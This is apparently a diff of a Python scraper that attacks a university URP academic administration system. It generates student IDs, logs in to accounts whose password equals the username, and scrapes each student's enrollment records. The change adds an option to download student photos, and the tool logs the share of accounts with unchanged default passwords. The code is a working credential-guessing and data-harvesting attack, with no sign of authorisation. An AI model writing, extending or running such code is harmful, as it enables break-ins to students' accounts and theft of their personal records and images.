@@ -1,10 +1,10 @@
 # -*- coding:utf-8 -*-
 """
-#############################
-#                           #
-#   URP 教务系统信收集工具    #
-#                           #
-#############################
+##############################
+#                            #
+#   URP 教务系统信息收集工具   #
+#                            #
+##############################
 @author:James
 Created on:18-2-8 14:25
 """
@@ -15,8 +15,8 @@ import gevent
 import urllib3
 from lxml import etree
 
-from URPRollInfo import db_init
-from URPRollInfo import settings
+from URPInfoSpider import db_init
+from URPInfoSpider import settings
 
 
 # 账号生成器
@@ -61,7 +61,7 @@ class InfoValidate(object):
 	def validate(self, all_account):
 		# 将所有校验过程加入队列
 		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
-		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)
+		gevent.joinall(jobs, timeout=0)
 
 	def validate_account(self, http, account):
 		# 登录请求参数
@@ -72,7 +72,7 @@ class InfoValidate(object):
 			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
 			'Cache-Control': 'max-age=0',
 			'Connection': 'Keep-alive',
-			'Host': settings.HOST,
+			'Host': settings.SERVER_HOST,
 			'Upgrade-Insecure-Requests': '1',
 			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
 		}
@@ -97,11 +97,14 @@ class InfoCollect(object):
 	def __init__(self):
 		self.logger = InfoMain.logger
 		self.http = InfoMain.http
+		# 功能模块
+		self.mod_get_roll_info = settings.MOD_ROLL_INFO
+		self.mod_get_roll_img = settings.MOD_ROLL_IMG
 
 	def get_info_queue(self, accounts):
 		# 将所有信息收集过程加入队列
 		jobs = [gevent.spawn(self.get_info, a) for a in accounts]
-		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)
+		gevent.joinall(jobs, timeout=0)
 
 	def get_info(self, stuid):
 		# 登录
@@ -116,22 +119,29 @@ class InfoCollect(object):
 			'Cache-Control': 'no-cache',
 			'Connection': 'Keep-alive',
 			'Cookie': cookie,
-			'Host': settings.HOST,
+			'Host': settings.SERVER_HOST,
 			'Pragma': 'no-cache',
 			'Upgrade-Insecure-Requests': 1,
 			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
 		}
-		# 带 Cookie 访问学籍信息页
-		response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=headers)
-		text = response_xjxx.data.decode('GB2312', 'ignore')
-		# 解析页面内容
-		selector = etree.HTML(text)
-		text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
 		# 学籍信息
-		result = []
-		for info in text_arr:
-			result.append(info.strip())
-		self.save_info(result)
+		if self.mod_get_roll_info:
+			# 带 Cookie 访问学籍信息页
+			response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=headers)
+			text = response_xjxx.data.decode('GB2312', 'ignore')
+			# 解析页面内容
+			selector = etree.HTML(text)
+			text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
+			# 学籍信息
+			result = []
+			for info in text_arr:
+				result.append(info.strip())
+			self.save_info(result)
+		# 学籍照片
+		if self.mod_get_roll_img:
+			response_xjzp = self.http.request('GET', settings.URL_XJZP, headers=headers)
+			self.logger.info(response_xjzp.data)
+
 		# 登出
 		self.http.request('POST', settings.URL_LOGOUT, headers=headers)
 
@@ -164,8 +174,8 @@ class InfoMain(object):
 	db = db_init.connect_db()
 	# HTTP 连接池
 	http = urllib3.HTTPConnectionPool(
-		host=settings.HOST,
-		port=80,
+		host=settings.SERVER_HOST,
+		port=settings.SERVER_PORT,
 		strict=False,
 		maxsize=100,
 		block=False,
@@ -174,6 +184,7 @@ class InfoMain(object):
 	)
 
 	def __init__(self):
+		# 日志
 		self.logger = InfoMain.logger
 
 	def autorun(self):
@@ -185,7 +196,7 @@ class InfoMain(object):
 		validator = InfoValidate()
 		validator.validate(all_account=all_account)
 		self.logger.info(validator.account_available)
-		# 收集信息
+		# 获取学籍信息
 		collector = InfoCollect()
 		collector.get_info_queue(validator.account_available)
 		# 计算
@@ -193,8 +204,9 @@ class InfoMain(object):
 		num_valid = len(validator.account_valid)
 		num_available = len(validator.account_available)
 		num_rate = (num_available / num_valid) * 100 if num_valid > 0 else 0
-		self.logger.info('总共尝试：{} 次，其中有效账号：{} 个，有效账号中用户名和密码一致的账号：{} 个，未修改密码的比例为：{:.2f}%'.format(
-			num_sum, num_valid, num_available, num_rate))
+		self.logger.info(
+			'总共尝试：{} 次，其中有效账号：{} 个，有效账号中用户名和密码一致的账号：{} 个，未修改密码的比例为：{:.2f}%'.format(
+				num_sum, num_valid, num_available, num_rate))
 
 
 if __name__ == '__main__':
